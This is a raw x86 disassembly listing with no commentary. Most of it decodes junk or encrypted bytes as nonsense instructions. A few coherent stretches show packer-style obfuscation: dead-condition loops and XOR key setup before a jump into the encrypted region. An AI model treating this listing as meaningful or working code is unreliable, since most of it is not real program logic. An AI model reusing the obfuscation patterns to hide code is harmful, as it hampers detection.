  4028b9:	dec    ebp
  4028ba:	div    ecx
  4028bc:	fild   DWORD PTR [ecx+0x7f32399a]
  4028c2:	mov    ch,0xbf
  4028c4:	mov    ah,0xea
  4028c6:	(bad)  
  4028c7:	sti    
  4028c8:	out    0x78,al
  4028ca:	adc    eax,0xaa6a5b12
  4028cf:	dec    edi
  4028d0:	sbb    ah,cl
  4028d2:	fstp   st(4)
  4028d4:	xor    BYTE PTR [ebx+0x382f73ba],ch
  4028da:	inc    edi
  4028db:	arpl   WORD PTR [edi+0x271c93cd],cx
  4028e1:	lock mov bl,0xbc
  4028e4:	or     bl,BYTE PTR [ebp-0x17]
  4028e7:	lods   al,BYTE PTR ds:[esi]
  4028e8:	dec    ebx
  4028e9:	jmp    0x402889
  4028eb:	std    
  4028ec:	retf   
  4028ed:	pop    ss
  4028ee:	mov    ds:0xfb1ca5fe,al
  4028f3:	and    eax,0x63a9fe1c
  4028f8:	pop    ebx
  4028f9:	inc    esp
  4028fa:	out    0x7a,al
  4028fc:	push   esi
  4028fd:	es (bad) 
  4028ff:	mov    dh,0xd8
  402901:	and    al,0xaf
  402903:	test   dh,ch
  402905:	mov    ecx,0xc045bfb6
  40290a:	dec    esi
  40290b:	test   dh,ah
  40290d:	mov    edi,0xa2f21d04
  402912:	cmp    eax,0x92c375a3
  402917:	mov    al,ds:0x17ca2715
  40291c:	in     al,0x18
  40291e:	inc    edx
  40291f:	add    al,BYTE PTR [eax-0x54]
  402922:	mov    ecx,0x8288f2e0
  402927:	in     eax,0xa9
  402929:	(bad)  
  40292a:	and    edx,DWORD PTR [eax]
  40292c:	lahf   
  40292d:	mov    BYTE PTR [edx-0x20],ch
  402930:	cmp    BYTE PTR [edi],bh
  402932:	pop    eax
  402933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402934:	add    esp,DWORD PTR [ecx-0x567fc6d0]
  40293a:	xchg   ecx,eax
  40293b:	in     eax,dx
  40293c:	fs in  eax,0xf
  40293f:	in     al,dx
  402940:	pop    esi
  402941:	push   es
  402942:	mov    ch,0x9d
  402944:	test   al,0x18
  402946:	xchg   DWORD PTR [edx+edi*1],edx
  402949:	fild   DWORD PTR [edx+0x5e]
  40294c:	mov    bh,0xbd
  40294e:	push   0xffffff8e
  402950:	adc    eax,0x97a807c6
  402955:	bound  ebp,QWORD PTR [ecx-0x4e449fe0]
  40295b:	jg     0x402982
  40295d:	pop    edx
  40295e:	pushf  
  40295f:	ins    DWORD PTR es:[edi],dx
  402960:	wbinvd 
  402962:	adc    esi,edx
  402964:	dec    esi
  402965:	daa    
  402966:	xchg   edx,eax
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fc5d
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e66f
  402988:	sbb    DWORD PTR ds:0x42e693,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fc69,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fc69,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fc69,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e0ac
  4029bc:	push   0x42e683
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e3cf
  4029cc:	mov    edx,DWORD PTR ds:0x42fc69
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fc69,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e67f,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e67f,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e67f,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e253
  402a0d:	cmp    DWORD PTR ds:0x42e67f,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e67f
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e67f,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e67f
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e67f,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fd2e
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fc55,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fc8d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e0a8,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e0a8,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e0a8
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e0a8,edi
  402a94:	cmp    DWORD PTR ds:0x42e0a8,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e0a8,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e0c1
  402ab3:	call   DWORD PTR ds:0x42e3d3
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0xb74ec062
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x7d70707e
  402afd:	push   edx
  402afe:	mov    bl,0xb1
  402b00:	pop    esp
  402b01:	test   al,0xa3
  402b04:	dec    esi
  402b05:	ret    0x80d6
  402b08:	push   ebp
  402b09:	and    DWORD PTR [ebx+0x2e5442c8],ebp
  402b0f:	mov    eax,0x52d64a9e
  402b14:	arpl   WORD PTR [eax+0x18],di
  402b17:	add    eax,0x2de3644
  402b1c:	sbb    al,0x8d
  402b1e:	ja     0x402abc
  402b20:	dec    ebp
  402b21:	aam    0x9b
  402b23:	rol    bl,0xd2
  402b26:	jg     0x402b1f
  402b28:	jnp    0x402b68
  402b2a:	fdivr  QWORD PTR [edx]
  402b2c:	sub    ebp,DWORD PTR [eax-0x37]
  402b2f:	popa   
  402b30:	mov    ds:0x1e9f8ed5,eax
  402b35:	retf   0x9641
  402b38:	dec    edx
  402b39:	adc    al,0x92
  402b3b:	cld    
  402b3c:	aad    0x63
  402b3e:	std    
  402b3f:	xor    ah,dh
  402b41:	mov    ah,0x5
  402b43:	repnz sub al,0x20
  402b46:	test   eax,0x11c95626
  402b4b:	dec    edi
  402b4c:	jno    0x402aff
  402b4e:	and    eax,0x8e4f8fe2
  402b53:	lahf   
  402b54:	popf   
  402b55:	call   0x14cc:0x957c5d5e
  402b5c:	dec    ebp
  402b5d:	or     dh,BYTE PTR [edi+0x64]
  402b60:	adc    eax,0xa018f1d9
  402b65:	popa   
  402b66:	test   DWORD PTR [ebx-0x17347d05],0xbc0242d8
  402b70:	div    dh
  402b72:	ja     0x402ba7
  402b74:	call   0xf05b9b87
  402b79:	inc    ebx
  402b7a:	adc    eax,DWORD PTR [ebx-0x5acad61e]
  402b80:	into   
  402b81:	dec    ebp
  402b82:	mov    eax,ds:0x28f276b1
  402b87:	push   cs
  402b88:	jmp    0x100e:0xf52ad517
  402b8f:	jmp    0xb2e7:0x9f04f208
  402b96:	es test al,dh
  402b99:	aad    0x1a
  402b9b:	mov    esi,0xc8f1e6ab
  402ba0:	xlat   BYTE PTR ds:[ebx]
  402ba1:	pop    ecx
  402ba2:	sbb    ch,ch
  402ba4:	sbb    eax,0xc4f873e1
  402ba9:	leave  
  402baa:	mov    bh,ch
  402bac:	inc    ecx
  402bad:	ins    BYTE PTR es:[edi],dx
  402bae:	in     eax,0xdb
  402bb0:	mov    cl,0x42
  402bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bb3:	push   ecx
  402bb4:	out    dx,eax
  402bb5:	jb     0x402c10
  402bb7:	push   edx
  402bb8:	adc    ebx,DWORD PTR [ebx-0x1e]
  402bbb:	fmul   DWORD PTR [ecx+0x67]
  402bbe:	cs aas 
  402bc0:	repnz popa 
  402bc2:	in     al,0x90
  402bc4:	xchg   esp,eax
  402bc5:	or     DWORD PTR [edi+0x43],ecx
  402bc8:	sbb    BYTE PTR ds:0x3b343627,dh
  402bce:	mov    ah,dh
  402bd0:	fcomp  QWORD PTR [ebp-0x5e8f565f]
  402bd6:	xlat   BYTE PTR ds:[ebx]
  402bd7:	inc    ebx
  402bd8:	sar    BYTE PTR [edx-0x12f82e8f],0xa
  402bdf:	pop    ebx
  402be0:	mov    ds:0x4954c62a,eax
  402be5:	xor    BYTE PTR [edi+0x76c29550],bl
  402beb:	(bad)
  402bee:	ss cli 
  402bf0:	test   DWORD PTR [edi-0x7a326335],esi
  402bf6:	or     DWORD PTR [ebx],ecx
  402bf8:	lahf   
  402bf9:	mov    ah,BYTE PTR es:[edi-0x231ac1b3]
  402c00:	outs   dx,BYTE PTR ds:[esi]
  402c01:	out    dx,eax
  402c02:	xlat   BYTE PTR ds:[ebx]
  402c03:	cmp    ebp,DWORD PTR [edx+ebp*4]
  402c06:	mov    ebp,0x91592a58
  402c0b:	cli    
  402c0c:	ds or  eax,0x1432b9a5
  402c12:	push   ds
  402c13:	sub    al,0xd3
  402c15:	add    edi,edx
  402c17:	pop    edi
  402c18:	es jns 0x402c6d
  402c1b:	into   
  402c1c:	lock pop edi
  402c1e:	call   0x52404c81
  402c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c24:	xor    dh,BYTE PTR [ebp-0xb]
  402c27:	sar    cl,cl
  402c29:	test   al,0xd9
  402c2b:	lock push eax
  402c2d:	xchg   edx,eax
  402c2e:	mov    dl,0x26
  402c30:	fucomip st,st(3)
  402c32:	(bad)  
  402c33:	and    BYTE PTR [esi+0x1f9767c],ch
  402c39:	dec    edi
  402c3a:	shr    DWORD PTR [edi+0x4b],cl
  402c3d:	dec    eax
  402c3e:	gs add bh,bl
  402c41:	add    al,0x8c
  402c43:	adc    al,0x18
  402c45:	in     al,dx
  402c46:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  402c48:	mov    dh,0x4c
  402c4a:	add    al,bh
  402c4c:	ror    DWORD PTR [edx-0x1c2692a7],1
  402c52:	ror    DWORD PTR [esi],0xa2
  402c55:	dec    eax
  402c56:	(bad)  
  402c57:	push   edi
  402c58:	popa   
  402c59:	push   esp
  402c5a:	dec    esi
  402c5b:	xor    BYTE PTR [ebx-0x57750994],0x55
  402c62:	ja     0x402c95
  402c64:	sbb    eax,0xd7c3f248
  402c69:	cmp    bl,BYTE PTR [edx+0xd]
  402c6c:	inc    edi
  402c6d:	pop    ebx
  402c6e:	lea    esi,[edx+ebp*8+0x67377269]
  402c75:	loope  0x402c5d
  402c77:	std    
  402c78:	loope  0x402c6e
  402c7a:	cmp    eax,0x2e834ee4
  402c80:	outs   dx,DWORD PTR ds:[esi]
  402c81:	and    BYTE PTR [edx],cl
  402c83:	or     ecx,DWORD PTR [esi]
  402c85:	mov    eax,ds:0xda97a93d
  402c8a:	and    ah,BYTE PTR [ebp-0x4a]
  402c8d:	dec    esi
  402c8e:	pop    ebx
  402c8f:	xchg   ecx,eax
  402c90:	pushf  
  402c91:	ja     0x402c16
  402c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c94:	push   edi
  402c95:	lods   al,BYTE PTR ds:[esi]
  402c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c97:	sbb    eax,0xf495fff6
  402c9c:	add    BYTE PTR [ebx],bh
  402c9e:	dec    eax
  402c9f:	stos   BYTE PTR es:[edi],al
  402ca0:	lds    ebx,FWORD PTR [ebx+0x5cdd149a]
  402ca6:	out    dx,al
  402ca7:	pop    ss
  402ca8:	jbe    0x402c84
  402caa:	pop    es
  402cab:	and    BYTE PTR [esi-0x33],0xa5
  402caf:	push   edi
  402cb0:	(bad)  
  402cb1:	push   ds
  402cb2:	jle    0x402d1e
  402cb4:	jno    0x402c68
  402cb6:	lds    ecx,FWORD PTR [ebp+0xc29aea2]
  402cbc:	push   cs
  402cbd:	sbb    al,0xc0
  402cbf:	repnz jecxz 0x402cd9
  402cc2:	add    al,0x28
  402cc4:	or     eax,0x781212fc
  402cc9:	mov    cl,0xd4
  402ccb:	adc    DWORD PTR [ecx+0x97e0408],edx
  402cd1:	ret    
  402cd2:	sub    ch,BYTE PTR [esi-0x7728694e]
  402cd8:	sbb    ah,BYTE PTR [ebx-0x6e8245bd]
  402cde:	stos   BYTE PTR es:[edi],al
  402cdf:	ret    0x4a92
  402ce2:	jns    0x402c92
  402ce4:	arpl   WORD PTR [ebx-0x78e541fb],ax
  402cea:	ss push es
  402cec:	adc    edi,DWORD PTR [esi+0x1a818c64]
  402cf2:	inc    BYTE PTR [ebx+esi*8+0xf]
  402cf6:	mov    BYTE PTR [esi-0x2ae71a7f],al
  402cfc:	cmp    dh,ah
  402cfe:	mov    cl,0x4d
  402d00:	sti    
  402d01:	push   0xc13c0b35
  402d06:	pop    edi
  402d07:	shr    DWORD PTR [edx+0x13e0c58f],cl
  402d0d:	leave  
  402d0e:	ins    BYTE PTR es:[edi],dx
  402d0f:	pop    ebx
  402d10:	ror    BYTE PTR [ebx],1
  402d12:	out    0x6e,al
  402d14:	pop    ebx
  402d15:	xchg   edi,eax
  402d16:	mov    esi,0xbac6dfdc
  402d1b:	and    ecx,DWORD PTR [edx]
  402d1d:	ss dec esp
  402d1f:	sbb    eax,0x502aa084
  402d24:	ins    DWORD PTR es:[edi],dx
  402d25:	jmp    0x6fdb:0x51eb7a20
  402d2c:	test   BYTE PTR [eax+0x3b98ea0b],dl
  402d32:	or     DWORD PTR [eax],0x7bcf33f9
  402d38:	popf   
  402d39:	mov    dh,0xc0
  402d3b:	scas   al,BYTE PTR es:[edi]
  402d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d3d:	arpl   WORD PTR [edx],di
  402d3f:	pop    es
  402d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d41:	xor    eax,0xaae3d3a5
  402d46:	sbb    DWORD PTR [ecx+0x62d5a960],eax
  402d4c:	xchg   edi,eax
  402d4d:	imul   eax,DWORD PTR [eax-0x6f],0x5873d6a8
  402d54:	add    bl,BYTE PTR [esi-0x1a]
  402d57:	and    edx,ebx
  402d59:	fsub   DWORD PTR [eax-0x53b1e7b2]
  402d5f:	mov    ch,0xdd
  402d61:	push   ebx
  402d62:	jne    0x402cec
  402d64:	jp     0x402dd6
  402d66:	loop   0x402d0b
  402d68:	xor    edi,DWORD PTR [ebp+0x7d9b43d5]
  402d6e:	addr16 cs jge 0x402dbb
  402d72:	loop   0x402dc8
  402d74:	shr    DWORD PTR [edi],0xc4
  402d77:	loope  0x402d16
  402d79:	push   eax
  402d7a:	ror    eax,1
  402d7c:	jno    0x402d8a
  402d7e:	aas    
  402d7f:	pop    ss
  402d80:	jp     0x402ddc
  402d82:	mov    ch,0xee
  402d84:	imul   ebp,DWORD PTR [ecx+0x28],0xadf94820
  402d8b:	mov    eax,ds:0x4423940f
  402d90:	and    eax,0xc5d2fcb7
  402d95:	aas    
  402d96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d97:	cwde   
  402d98:	(bad)  
  402d99:	int    0xb7
  402d9b:	rcl    DWORD PTR [ecx+esi*4],0x14
  402d9f:	xchg   ebp,eax
  402da0:	loopne 0x402dd7
  402da2:	sbb    bh,dl
  402da4:	mov    esi,0x88fb4b54
  402da9:	mov    al,0xc1
  402dab:	mov    bl,0x3c
  402dad:	hlt    
  402dae:	popf   
  402daf:	push   0xffffffab
  402db1:	add    al,0x67
  402db3:	cs sbb ah,al
  402db6:	out    dx,al
  402db7:	pop    esp
  402db8:	xchg   BYTE PTR ds:[edx+0x6e],ah
  402dbc:	fsub   QWORD PTR [ebx-0x28c429fd]
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	addr16 push esp
  402de1:	mov    ch,0xc2
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402e5d
  402dec:	dec    ebx
  402ded:	je     0x402d7e
  402def:	leave  
  402df0:	xchg   al,bl
  402df2:	mov    DWORD PTR [edi-0x35],0x4d8b977d
  402df9:	jle    0x402d94
  402dfb:	outs   dx,DWORD PTR ds:[esi]
  402dfc:	adc    WORD PTR [edi-0x18998ef0],0xb579
  402e05:	call   0xc76cd37b
  402e0a:	fs mov ebx,0x8f9b5ad
  402e10:	aam    0xfe
  402e12:	or     eax,0x8e7a4a57
  402e17:	sub    al,dl
  402e19:	jne    0x402e07
  402e1b:	scas   eax,DWORD PTR es:[edi]
  402e1c:	mov    edx,0xac5b771b
  402e21:	fs adc ecx,eax
  402e24:	push   es
  402e25:	mov    ds:0x78da7cbb,eax
  402e2a:	fist   DWORD PTR [edx+0x2154605c]
  402e30:	mov    eax,0x80a03850
  402e35:	fiadd  DWORD PTR [edi-0x75]
  402e38:	mov    eax,0x8480a852
  402e3d:	das    
  402e3e:	aas    
  402e3f:	xor    esp,DWORD PTR [esi]
  402e41:	and    BYTE PTR [ecx+0x8014f3],ah
  402e47:	shl    BYTE PTR [eax],0x6e
  402e4a:	sbb    eax,0x9d14836f
  402e4f:	call   0x731a0013
  402e54:	scas   al,BYTE PTR es:[edi]
  402e55:	int    0x1c
  402e57:	test   al,0x35
  402e59:	dec    edx
  402e5a:	fmulp  st(6),st
  402e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e5d:	(bad)  
  402e5e:	add    eax,0xf1078959
  402e63:	inc    esp
  402e64:	ins    DWORD PTR es:[edi],dx
  402e65:	xor    dh,dh
  402e67:	sub    BYTE PTR [edx-0x7924d21b],ch
  402e6d:	mov    eax,0xd2748988
  402e72:	jl     0x402e72
  402e74:	xlat   BYTE PTR ds:[ebx]
  402e75:	adc    esp,DWORD PTR [eax]
  402e77:	icebp  
  402e78:	ins    BYTE PTR es:[edi],dx
  402e79:	mov    ch,0xf5
  402e7b:	add    al,0x75
  402e7d:	sbb    dh,0x62
  402e80:	sbb    edx,DWORD PTR [esi+esi*8-0x1af6ebba]
  402e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e88:	cmp    al,0x3c
  402e8a:	mov    bl,0xc8
  402e8c:	lods   eax,DWORD PTR ds:[esi]
  402e8d:	add    al,0x12
  402e8f:	popa   
  402e90:	adc    ch,dl
  402e92:	dec    ch
  402e94:	outs   dx,BYTE PTR ds:[esi]
  402e95:	and    al,0x36
  402e97:	cdq    
  402e98:	(bad)  
  402e99:	shr    BYTE PTR [ecx+0x29f0bf2e],1
  402e9f:	jnp    0x402e28
  402ea1:	(bad)  
  402ea2:	fld    DWORD PTR [ebx+esi*4-0x1b]
  402ea6:	mov    gs,WORD PTR [esp+esi*1]
  402ea9:	sbb    BYTE PTR [edx-0x43],ch
  402eac:	sbb    ch,cl
  402eae:	xchg   edi,eax
  402eaf:	(bad)  
  402eb1:	call   0xea8:0x48033cf4
  402eb8:	push   edx
  402eb9:	mov    edx,edi
  402ebb:	or     BYTE PTR [esi+eax*2+0x1a],dl
  402ebf:	lahf   
  402ec0:	xchg   edi,eax
  402ec1:	shl    BYTE PTR [esi+0x61],1
  402ec4:	lods   al,BYTE PTR ds:[esi]
  402ec5:	test   eax,0xd9cbd69f
  402eca:	and    ah,BYTE PTR [edi-0x1461f088]
  402ed0:	xor    BYTE PTR [ebx+0x24dbc82d],dl
  402ed6:	imul   edi,DWORD PTR [eax-0x18c69e71],0xffffffa3
  402edd:	cdq    
  402ede:	pop    ss
  402edf:	inc    edx
  402ee0:	inc    ebp
  402ee1:	sub    BYTE PTR [eax+0x55],dh
  402ee4:	jb     0x402efb
  402ee6:	bound  ebp,QWORD PTR [edi+eax*2]
  402ee9:	sbb    al,BYTE PTR [esi+ebx*1+0x2e]
  402eed:	inc    ebp
  402eee:	sub    bh,0x31
  402ef1:	(bad)  
  402ef2:	jg     0x402f5c
  402ef4:	stos   DWORD PTR es:[edi],eax
  402ef5:	inc    edx
  402ef6:	call   0xe61972bb
  402efb:	and    ebx,DWORD PTR [ecx-0x29c01845]
  402f01:	ja     0x402f48
  402f03:	add    dl,BYTE PTR [ecx+0x37]
  402f06:	adc    ch,dh
  402f08:	ret    
  402f09:	sub    eax,0xfa4ec09e
  402f0e:	cmp    eax,0x9591f327
  402f13:	lea    ecx,[ebp-0x3d]
  402f16:	jb     0x402f0d
  402f18:	push   edi
  402f19:	xchg   ebp,eax
  402f1a:	aad    0x2c
  402f1c:	push   cs
  402f1d:	pop    ss
  402f1e:	jmp    FWORD PTR [eax]
  402f20:	fbld   TBYTE PTR [ecx]
  402f22:	lods   al,BYTE PTR ds:[esi]
  402f23:	(bad)  
  402f24:	ds cwde 
  402f26:	pop    ecx
  402f27:	int    0xf6
  402f29:	inc    esp
  402f2a:	das    
  402f2b:	jmp    0x402eec
  402f2d:	sub    eax,0xf0fa477f
  402f32:	jno    0x402f40
  402f34:	mov    eax,ds:0x2f2d4620
  402f39:	fistp  QWORD PTR [edi]
  402f3b:	jge    0x402f36
  402f3d:	mov    al,0x38
  402f3f:	rol    dh,cl
  402f41:	dec    esi
  402f42:	lock xor cl,0x82
  402f46:	jg     0x402f14
  402f48:	stc    
  402f49:	adc    BYTE PTR ds:0xb6878816,ch
  402f4f:	pop    edi
  402f50:	sub    DWORD PTR es:[edi+0x69574372],0xffffffe1
  402f58:	jl     0x402f9b
  402f5a:	sbb    DWORD PTR [ebx+0x31932537],edi
  402f60:	cmc    
  402f61:	out    dx,eax
  402f62:	adc    bl,BYTE PTR [edx+edi*1-0x11]
  402f66:	sbb    bl,bh
  402f68:	(bad)  
  402f69:	sbb    eax,0x5b1b5a4c
  402f6e:	push   esi
  402f6f:	fwait
  402f70:	adc    ecx,ebx
  402f72:	adc    al,0x62
  402f74:	adc    BYTE PTR [edx-0x3a],ah
  402f77:	push   ds
  402f78:	inc    edi
  402f79:	sar    DWORD PTR [edi-0x31],cl
  402f7c:	(bad)  
  402f7d:	js     0x402fa7
  402f7f:	inc    eax
  402f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f81:	dec    esi
  402f82:	sbb    DWORD PTR [esi+esi*8-0x22a70393],edi
  402f89:	mov    ebp,0x4a71ff4b
  402f8e:	or     eax,0x206c2f1f
  402f93:	cmp    eax,0x524ee78b
  402f98:	jns    0x402f88
  402f9a:	inc    esi
  402f9b:	pusha  
  402f9c:	push   ss
  402f9d:	xchg   ebx,eax
  402f9e:	and    dh,BYTE PTR [edi-0x46]
  402fa1:	xchg   ecx,eax
  402fa2:	inc    ecx
  402fa3:	jno    0x40300a
  402fa5:	mov    ds:0x9b6ee2b0,al
  402faa:	pop    esi
  402fab:	aas    
  402fac:	aad    0xc0
  402fae:	mov    eax,ds:0xd4cc6a17
  402fb3:	xor    eax,edi
  402fb5:	bound  edx,QWORD PTR ss:[ebp+0x2a548637]
  402fbc:	jl     0x402f91
  402fbe:	cmp    ebx,esi
  402fc0:	mov    esp,DWORD PTR [edx+0x26]
  402fc3:	cmp    ch,ah
  402fc5:	mov    edi,0x2d209b8d
  402fca:	sub    al,0x3a
  402fcc:	cld    
  402fcd:	push   ecx
  402fce:	cli    
  402fcf:	mul    DWORD PTR [esi+0x61569b47]
  402fd5:	les    ecx,FWORD PTR [esi-0x33]
  402fd8:	dec    edx
  402fd9:	lock add bh,BYTE PTR fs:[edi]
  402fdd:	in     eax,dx
  402fde:	jmp    0x402fd2
  402fe0:	mov    ch,0x5d
  402fe2:	popf   
  402fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fe4:	jne    0x403044
  402fe6:	adc    dh,ah
  402fe8:	(bad)  
  402fea:	sub    al,BYTE PTR [esi+0x16]
  402fed:	call   0x6963d3e0
  402ff2:	push   0x992974c2
  402ff7:	mov    ebp,DWORD PTR [esi-0x71552aa4]
  402ffd:	test   DWORD PTR [esi],edi
  402fff:	sar    bh,1
  403001:	jo     0x402fcc
  403003:	adc    edi,DWORD PTR [edx]
  403005:	dec    edi
  403006:	pushf  
  403007:	sub    DWORD PTR [ebx],0x9ac973b3
  40300d:	jmp    0x20a12d87
  403012:	sub    eax,0x2be14bce
  403017:	and    al,0x22
  403019:	pop    ecx
  40301a:	setl   BYTE PTR [ebx+ebx*4-0xd]
  40301f:	into   
  403020:	imul   ebp,esp,0xffffffc6
  403023:	in     al,0x55
  403025:	rcl    BYTE PTR [edx],cl
  403027:	imul   ebx,DWORD PTR ds:0x80a67fec,0xfffffff1
  40302e:	loopne 0x40300f
  403030:	adc    DWORD PTR [eax],esp
  403032:	push   edi
  403033:	sbb    eax,eax
  403035:	fdivr  QWORD PTR [edx+0x2d646fea]
  40303b:	or     eax,0x914799eb
  403040:	ret    0xd7b0
  403043:	nop
  403044:	xor    ch,dl
  403046:	out    dx,al
  403047:	add    ch,BYTE PTR [ebx-0x24]
  40304a:	cmp    DWORD PTR ds:0xc9147e87,edx
  403050:	mov    bh,0x29
  403052:	or     BYTE PTR [eiz*4+0x4f036670],ah
  403059:	cld    
  40305a:	je     0x403041
  40305c:	mov    ebx,0xc6d059e5
  403061:	mov    cl,0xc2
  403063:	mov    BYTE PTR [eax],0xca
  403066:	cmp    eax,ebx
  403068:	test   eax,0x84bcc266
  40306d:	fadd   QWORD PTR [edx]
  40306f:	xchg   DWORD PTR [edi+0x16],ebp
  403072:	jle    0x4030c3
  403074:	popa   
  403075:	push   0xffffffc7
  403077:	int    0x63
  403079:	jmp    0xb0d5:0xdc825062
  403080:	cdq    
  403081:	pop    es
  403082:	in     eax,0x35
  403084:	pop    ebx
  403085:	cwde   
  403086:	adc    DWORD PTR [edx-0x17],0xffffffd0
  40308a:	jae    0x40305f
  40308c:	jl     0x403010
  40308e:	jge    0x403088
  403090:	imul   ebx,DWORD PTR [ebx+0x1f],0x11c212e6
  403097:	inc    esi
  403098:	xchg   edi,eax
  403099:	lods   eax,DWORD PTR ds:[esi]
  40309a:	cmp    al,0xf2
  40309c:	test   DWORD PTR [esi-0x50],esp
  40309f:	cld    
  4030a0:	(bad)  [edi-0x19]
  4030a3:	(bad)  [ecx+0x38]
  4030a6:	jg     0x40304a
  4030a8:	out    0x2a,al
  4030aa:	repz add BYTE PTR es:[esi+0x32729c],bh
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xf7
  4030ce:	test   BYTE PTR [ecx+0x7017fcc1],al
  4030d4:	jo     0x403094
  4030d6:	jle    0x403148
  4030d8:	jo     0x4030a0
  4030da:	xchg   edi,eax
  4030db:	xchg   edi,eax
  4030dc:	scas   al,BYTE PTR es:[edi]
  4030dd:	lds    eax,FWORD PTR [eax-0x31]
  4030e0:	cld    
  4030e1:	dec    ebx
  4030e2:	inc    eax
  4030e3:	push   0xfffffff0
  4030e5:	(bad)  
  4030e6:	into   
  4030e7:	dec    ebp
  4030e8:	xchg   edx,eax
  4030e9:	fdiv   st,st(5)
  4030eb:	pop    esi
  4030ec:	or     BYTE PTR [edx-0x4f4bf07],dl
  4030f2:	xor    al,bh
  4030f4:	mov    bl,BYTE PTR [eax]
  4030f6:	add    ebx,DWORD PTR [ecx+0x71f8ac5f]
  4030fc:	loopne 0x40309b
  4030fe:	push   ds
  4030ff:	loopne 0x4030e1
  403101:	jg     0x40314e
  403103:	cs lahf 
  403105:	fbld   TBYTE PTR [ecx+0x33d8a4f8]
  40310b:	pusha  
  40310c:	mov    edi,0x45ac8d8c
  403111:	add    bh,BYTE PTR [eax+eax*2+0x1e80a58a]
  403118:	jnp    0x4030e9
  40311a:	dec    ebp
  40311b:	ror    ebp,0x3b
  40311e:	test   eax,0xf4bf875d
  403123:	data16 sti 
  403125:	pop    ss
  403126:	dec    edi
  403127:	adc    edi,DWORD PTR [esi-0x5b]
  40312a:	das    
  40312b:	cli    
  40312c:	jp     0x4030ae
  40312e:	stos   BYTE PTR es:[edi],al
  40312f:	mov    ecx,0x3b9d4792
